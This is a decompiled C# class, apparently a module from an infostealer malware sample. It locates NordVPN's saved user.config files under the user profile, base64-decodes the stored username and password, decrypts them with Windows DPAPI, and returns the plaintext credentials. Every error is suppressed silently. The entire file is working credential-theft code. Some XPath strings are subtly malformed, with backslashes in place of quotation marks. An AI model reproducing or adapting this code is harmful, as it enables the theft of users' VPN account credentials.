using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;

// Token: 0x02000008 RID: 8
public class NordApp
{
	// Token: 0x06000020 RID: 32 RVA: 0x00005774 File Offset: 0x00003974
	public static List<Account> Find()
	{
		List<Account> list = new List<Account>();
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%\\AppData\\Local"), "NordVPN"));
			if (!directoryInfo.Exists)
			{
				return list;
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories("NordVpn.exe*");
			for (int i = 0; i < directories.Length; i++)
			{
				foreach (DirectoryInfo directoryInfo2 in directories[i].GetDirectories())
				{
					try
					{
						string text = Path.Combine(directoryInfo2.FullName, "user.config");
						if (File.Exists(text))
						{
							XmlDocument xmlDocument = new XmlDocument();
							xmlDocument.Load(text);
							string innerText = xmlDocument.SelectSingleNode(" //setting[@name=\\Username\\]/value").InnerText;
							string innerText2 = xmlDocument.SelectSingleNode("//setting[@name=\\Password\\]/value").InnerText;
							if (!string.IsNullOrWhiteSpace(innerText) && !string.IsNullOrWhiteSpace(innerText2))
							{
								string @string = Encoding.UTF8.GetString(Convert.FromBase64String(innerText));
								string string2 = Encoding.UTF8.GetString(Convert.FromBase64String(innerText2));
								string text2 = CryptoHelper.DecryptBlob(@string, DataProtectionScope.LocalMachine, null);
								string text3 = CryptoHelper.DecryptBlob(string2, DataProtectionScope.LocalMachine, null);
								if (!string.IsNullOrWhiteSpace(text2) && !string.IsNullOrWhiteSpace(text3))
								{
									list.Add(new Account
									{
										Username = text2,
										Password = text3
									});
								}
							}
						}
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
		return list;
	}
}
